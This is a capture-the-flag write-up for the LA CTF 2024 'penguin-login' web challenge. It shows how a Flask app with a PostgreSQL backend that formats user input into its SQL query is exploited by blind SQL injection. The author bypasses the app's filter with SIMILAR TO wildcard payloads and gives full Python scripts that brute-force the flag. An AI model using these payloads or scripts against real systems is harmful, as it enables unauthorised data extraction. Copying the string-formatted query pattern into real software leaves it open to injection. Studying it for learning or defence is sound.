# penguin-login

## Table of Contents

1. [Overview](#overview)
2. [Background](#background)
3. [Enumeration](#enumeration)
4. [Exploitation](#exploitation)
5. [Conclusion](#conclusion)

## Overview

- Solved by: @siunam, @colonneil
- 182 solves / 392 points
- Author: r2uwu2
- Overall difficulty for me (From 1-10 stars): ★★☆☆☆☆☆☆☆☆

## Background

I got tired of people leaking my password from the db so I moved it out of the db. [penguin.chall.lac.tf](https://penguin.chall.lac.tf)

![](https://github.com/siunam321/CTF-Writeups/blob/main/LA-CTF-2024/images/Pasted%20image%2020240219154527.png)

## Enumeration

**Index page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/LA-CTF-2024/images/Pasted%20image%2020240219154711.png)

In here, it has an input box.

Let's enter some dummy text into it:

![](https://github.com/siunam321/CTF-Writeups/blob/main/LA-CTF-2024/images/Pasted%20image%2020240219154742.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/LA-CTF-2024/images/Pasted%20image%2020240219154750.png)

**Burp Suite HTTP history:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/LA-CTF-2024/images/Pasted%20image%2020240219154807.png)

When we submit the form, it'll send a POST request to `/submit` with parameter name `username`.

Not much we can do in here, let's read through this web application's source code!

**In this challenge, we can download a [file](https://github.com/siunam321/CTF-Writeups/blob/main/LA-CTF-2024/web/penguin-login/penguin-login.zip):**
```shell
┌[siunam♥Mercury]-(~/ctf/LA-CTF-2024/web/penguin-login)-[2024.02.19|15:49:08(HKT)]
└> file penguin-login.zip 
penguin-login.zip: Zip archive data, at least v2.0 to extract, compression method=deflate
┌[siunam♥Mercury]-(~/ctf/LA-CTF-2024/web/penguin-login)-[2024.02.19|15:49:09(HKT)]
└> unzip penguin-login.zip 
Archive:  penguin-login.zip
  inflating: app.py                  
  inflating: docker-compose.yaml     
  inflating: Dockerfile              
 extracting: requirements.txt        
```

After reading the source code, we have the following findings:

**The DBMS (Database Management System) is PostgreSQL:**
```python
[...]
import os
from functools import cache
[...]
import psycopg2
[...]
@cache
def get_database_connection():
    # Get database credentials from environment variables
    db_user = os.environ.get("POSTGRES_USER")
    db_password = os.environ.get("POSTGRES_PASSWORD")
    db_host = "db"

    # Establish a connection to the PostgreSQL database
    connection = psycopg2.connect(user=db_user, password=db_password, host=db_host)

    return connection
[...]
```

**The database is initialized when the Flask app is running:**
```python
[...]
from flask import Flask, request

app = Flask(__name__)
flag = Path("/app/flag.txt").read_text().strip()
[...]
with app.app_context():
    conn = get_database_connection()
    create_sql = """
        DROP TABLE IF EXISTS penguins;
        CREATE TABLE IF NOT EXISTS penguins (
            name TEXT
        )
    """
    with conn.cursor() as curr:
        curr.execute(create_sql)
        curr.execute("SELECT COUNT(*) FROM penguins")
        if curr.fetchall()[0][0] == 0:
            curr.execute("INSERT INTO penguins (name) VALUES ('peng')")
            curr.execute("INSERT INTO penguins (name) VALUES ('emperor')")
            curr.execute("INSERT INTO penguins (name) VALUES ('%s')" % (flag))
        conn.commit()
[...]
```

In here, we can see that a table named `penguins` is created, and it has column `name`. In those 3 `INSERT` SQL query, **the flag was inserted into table `penguins`**.

**The most interesting is the POST method route `/submit`:**
```python
[...]
allowed_chars = set(string.ascii_letters + string.digits + " 'flag{a_word}'")
forbidden_strs = ["like"]
[...]
@app.post("/submit")
def submit_form():
    conn = None
    try:
        username = request.form["username"]
        conn = get_database_connection()

        assert all(c in allowed_chars for c in username), "no character for u uwu"
        assert all(
            forbidden not in username.lower() for forbidden in forbidden_strs
        ), "no word for u uwu"

        with conn.cursor() as curr:
            curr.execute("SELECT * FROM penguins WHERE name = '%s'" % username)
            result = curr.fetchall()

        if len(result):
            return "We found a penguin!!!!!", 200
        return "No penguins sadg", 201

    except Exception as e:
        return f"Error: {str(e)}", 400

    # need to commit to avoid connection going bad in case of error
    finally:
        if conn is not None:
            conn.commit()
[...]
```

**In here, we can see that the executing SQL query is vulnerable to SQL injection, as it doesn't use prepared statement:**
```python
with conn.cursor() as curr:
    curr.execute("SELECT * FROM penguins WHERE name = '%s'" % username)
    result = curr.fetchall()
```

**Also, the result doesn't get reflected. When result is returned, it just response back `We found a penguin!!!!!`:**
```python
if len(result):
    return "We found a penguin!!!!!", 200
return "No penguins sadg", 201
```

So, this route is vulnerable to **Blind-based SQL injection**!

**However, it does some filtering:**
```python
allowed_chars = set(string.ascii_letters + string.digits + " 'flag{a_word}'")
forbidden_strs = ["like"]
[...]
assert all(c in allowed_chars for c in username), "no character for u uwu"
assert all(
    forbidden not in username.lower() for forbidden in forbidden_strs
), "no word for u uwu"
```

**As you can see, the following characters and string are not allowed:**
```
Allowed characters:
 '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz{}
 
Allowed string:
like
```

Hmm... How can we **leak the flag without using `LIKE` clause**...
 
After Googling "postgresql like alternative", I found **this StackOverflow post: [https://stackoverflow.com/questions/12452395/difference-between-like-and-in-postgres](https://stackoverflow.com/questions/12452395/difference-between-like-and-in-postgres)**:

![](https://github.com/siunam321/CTF-Writeups/blob/main/LA-CTF-2024/images/Pasted%20image%2020240219161132.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/LA-CTF-2024/images/Pasted%20image%2020240219161225.png)

Wait, `SIMILAR TO`?

According to [pattern matching operators in PostgreSQL](https://www.postgresql.org/docs/current/functions-matching.html#FUNCTIONS-SIMILARTO-REGEXP), **we can use `SIMILAR TO` operator to replace `LIKE` clause, which allows us to use regular expression pattern to find the matches string:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/LA-CTF-2024/images/Pasted%20image%2020240219161411.png)

Also, according to [w3resource about `SIMILAR TO` operator](https://www.w3resource.com/PostgreSQL/postgresql-similar-operator.php), the example is like this:

```sql
SELECT <column_name> FROM <table_name> WHERE <column_name> SIMILAR TO '<regular_expression_pattern>';
```

## Exploitation

Based on the above findings, we can exfiltrate the flag via exploiting **Blind-based SQL injection with `SIMILAR TO` operator**!

**Now, our payload can be:**
```sql
' OR name SIMILAR TO '<regular_expression_pattern>'
```

But wait, this will cause syntax error because the single quote didn't get closed. We also can't use comment because those characters aren't in the `allowed_chars`:

![](https://github.com/siunam321/CTF-Writeups/blob/main/LA-CTF-2024/images/Pasted%20image%2020240219162315.png)

**To bypass that, we can just leave the single quote open, like this:**
```sql
' OR name SIMILAR TO '<regular_expression_pattern>
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/LA-CTF-2024/images/Pasted%20image%2020240219162328.png)

Uhh... Then? How can we use regular expression pattern to leak the flag?

According to [W3Schools](https://www.w3schools.com/sql/sql_wildcards.asp), PostgreSQL has some **wildcard characters**:

![](https://github.com/siunam321/CTF-Writeups/blob/main/LA-CTF-2024/images/Pasted%20image%2020240219162649.png)

Since `%` is not in the `allowed_chars`, **we'll have to use `_` wildcard character**.

Now, with the knowledge of wildcard characters, we can try to leak the flag.

- Determine the flag's string length:

To find out the flag's string length, we can use `_` multiple wildcard characters. If the string length doesn't match with our wildcard characters length, it'll return `False`, otherwise returns `True`.

**To do so, we can write a Python script to automate that:**
```python
#!/usr/bin/env python3
import requests

class Exploit:
    def __init__(self, baseUrl):
        self.baseUrl = baseUrl
        self.SUBMIT_ROUTE = '/submit'
        self.WILDCARD_CHARACTER = '_'
        self.EXCLUDED_NAMES = ('peng', 'emperor')
        self.EXCLUDED_NAMES_LENGTH = (len(self.EXCLUDED_NAMES[0]), len(self.EXCLUDED_NAMES[1]))

    def leakFlagStringLength(self):
        for length in range(1, 100):
            print(f'[*] Finding flag string length. Current length: {length}', end='\r')

            payload = f"' OR name SIMILAR TO '{self.WILDCARD_CHARACTER * length}"
            data = {
                'username': payload
            }
            
            response = requests.post(f'{self.baseUrl}{self.SUBMIT_ROUTE}', data=data)
            isFailed = True if response.status_code == 201 else False
            if isFailed:
                continue
            if length == self.EXCLUDED_NAMES_LENGTH[0] or length == self.EXCLUDED_NAMES_LENGTH[1]:
                print(f'[*] Length {length} returned boolean value True, but the length is same as the database\'s penguin name')
                continue

            return length

if __name__ == '__main__':
    baseUrl = 'https://penguin.chall.lac.tf'
    exploit = Exploit(baseUrl)

    flagStringLength = exploit.leakFlagStringLength()
    print(f'[+] We found the correct flag string length: {flagStringLength}')
```

```shell
┌[siunam♥Mercury]-(~/ctf/LA-CTF-2024/web/penguin-login)-[2024.02.19|16:43:37(HKT)]
└> python3 exploit.py
[*] Length 4 returned boolean value True, but the length is same as the database's penguin name
[*] Length 7 returned boolean value True, but the length is same as the database's penguin name
[+] We found the correct flag string length: 45
```

Now we know that the flag string length is `45`!

- Leak the flag:

In this step, we can simply **brute force the flag's character with the `allowed_chars`**! 

**However, it's worth noting that an error will occurred with the following SQL query:** 
```sql
' OR name SIMILAR TO 'lactf{1______________________________________
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/LA-CTF-2024/images/Pasted%20image%2020240219165553.png)

This is because, in regular expression, `{x}` is to **match previous token (Character) exactly x times**.

Since we know the flag format is `lactf{.*}`, we can **just not to prepend and append the `lactf{` and `}`** to the regular expression pattern.

**So, our payload will be something like this:**
```sql
' OR name SIMILAR TO '______1______________________________________
' OR name SIMILAR TO '______12_____________________________________
' OR name SIMILAR TO '______123____________________________________
```

**Armed with above information, we can finish our Python solve script:**
```python
#!/usr/bin/env python3
import requests
from string import ascii_letters, digits

class Exploit:
    def __init__(self, baseUrl):
        self.baseUrl = baseUrl
        self.SUBMIT_ROUTE = '/submit'
        self.WILDCARD_CHARACTER = '_'
        self.EXCLUDED_NAMES = ('peng', 'emperor')
        self.EXCLUDED_NAMES_LENGTH = tuple(len(name) for name in self.EXCLUDED_NAMES)

        # underscore (_) and single quote (') character is excluded, 
        # because it's the wildcard character and will cause syntax error
        # space ( ) character is also excluded, because the flag format shouldn't have that character?
        self.ALLOWED_CHARS = sorted(set(ascii_letters + digits + "flag{aword}"))
        self.PREPENDED_FLAG = 'lactf{'
        self.PREPENDED_FLAG_LENGTH = len(self.PREPENDED_FLAG)
        self.APPENDED_FLAG = '}'
        self.APPENDED_FLAG_LENGTH = len(self.APPENDED_FLAG)

    def leakFlagStringLength(self):
        for length in range(1, 100):
            print(f'[*] Finding flag string length | Current length: {length}', end='\r')

            payload = f"' OR name SIMILAR TO '{self.WILDCARD_CHARACTER * length}"
            data = {
                'username': payload
            }
            
            response = requests.post(f'{self.baseUrl}{self.SUBMIT_ROUTE}', data=data)
            isFailed = True if response.status_code == 201 else False
            if isFailed:
                continue
            if length == self.EXCLUDED_NAMES_LENGTH[0] or length == self.EXCLUDED_NAMES_LENGTH[1]:
                if length == self.EXCLUDED_NAMES_LENGTH[0]:
                    print(f'[*] Length {length} returned boolean value True, but the length is same as the database\'s penguin name "{self.EXCLUDED_NAMES[0]}"')
                elif length == self.EXCLUDED_NAMES_LENGTH[1]:
                    print(f'[*] Length {length} returned boolean value True, but the length is same as the database\'s penguin name "{self.EXCLUDED_NAMES[1]}"')

                continue

            return length

    def leakFlagData(self, flagStringLength):
        leakedFlag, formattedFlag = str(), str()
        while len(formattedFlag) < flagStringLength:
            formattedFlag = self.PREPENDED_FLAG + leakedFlag + self.APPENDED_FLAG
            if len(formattedFlag) == flagStringLength:
                break

            for character in self.ALLOWED_CHARS:
                print(f'[*] Brute forcing character "{character}" | Current leaked flag: {formattedFlag}', end='\r')

                regexCharacters = leakedFlag + character
                charactersLeft = flagStringLength - self.PREPENDED_FLAG_LENGTH - self.APPENDED_FLAG_LENGTH - len(regexCharacters)

                regexPattern = self.WILDCARD_CHARACTER * self.PREPENDED_FLAG_LENGTH
                regexPattern += regexCharacters
                regexPattern += self.WILDCARD_CHARACTER * charactersLeft
                regexPattern += self.WILDCARD_CHARACTER * self.APPENDED_FLAG_LENGTH

                payload = f"' OR name SIMILAR TO '{regexPattern}"
                data = {
                    'username': payload
                }
                response = requests.post(f'{self.baseUrl}{self.SUBMIT_ROUTE}', data=data)
                isFailed = True if response.status_code == 201 else False
                isLastCharacter = True if character == self.ALLOWED_CHARS[-1] else False
                isFailedLastCharacter = True if isFailed and isLastCharacter else False

                # if we loop through all possible character and still failed, 
                # we can assume that the correct flag character is the underscore character
                if isFailedLastCharacter:
                    leakedFlag += self.WILDCARD_CHARACTER
                    break

                if isFailed:
                    continue

                leakedFlag += character
                break

        isLeakedSuccessfully = False
        if len(formattedFlag) != flagStringLength:
            return isLeakedSuccessfully, formattedFlag

        isLeakedSuccessfully = True
        return isLeakedSuccessfully, formattedFlag

if __name__ == '__main__':
    baseUrl = 'https://penguin.chall.lac.tf'
    exploit = Exploit(baseUrl)

    print('[*] Leaking the flag string length...')
    flagStringLength = exploit.leakFlagStringLength()
    if not flagStringLength:
        print('\n[-] Unable to find the correct flag string length')
        exit(0)

    print(f'\n[+] We found the correct flag string length: {flagStringLength}')

    print('[*] Leaking the flag...')
    isLeakedSuccessfully, formattedFlag = exploit.leakFlagData(flagStringLength)
    if not isLeakedSuccessfully:
        print(f'\n[-] The leaked flag length is not the same as the flag string length ({flagStringLength}). Leaked flag: {formattedFlag}')
        exit(0)

    print(f'\n[+] The flag has been fully leaked! Flag: {formattedFlag}')
```

```shell
┌[siunam♥Mercury]-(~/ctf/LA-CTF-2024/web/penguin-login)-[2024.02.19|21:43:59(HKT)]
└> python3 exploit.py
[*] Leaking the flag string length...
[*] Length 4 returned boolean value True, but the length is same as the database's penguin name "peng"
[*] Length 7 returned boolean value True, but the length is same as the database's penguin name "emperor"
[*] Finding flag string length | Current length: 45
[+] We found the correct flag string length: 45
[*] Leaking the flag...
[*] Brute forcing character "0" | Current leaked flag: lactf{90stgr35_3s_n0t_l7k3_th3_0th3r_dbs_0w}
[+] The flag has been fully leaked! Flag: lactf{90stgr35_3s_n0t_l7k3_th3_0th3r_dbs_0w0}
```

- **Flag: `lactf{90stgr35_3s_n0t_l7k3_th3_0th3r_dbs_0w0}`**

## Conclusion

What we've learned:

1. PostgreSQL Blind-based SQL injection with conditional responses and filter bypass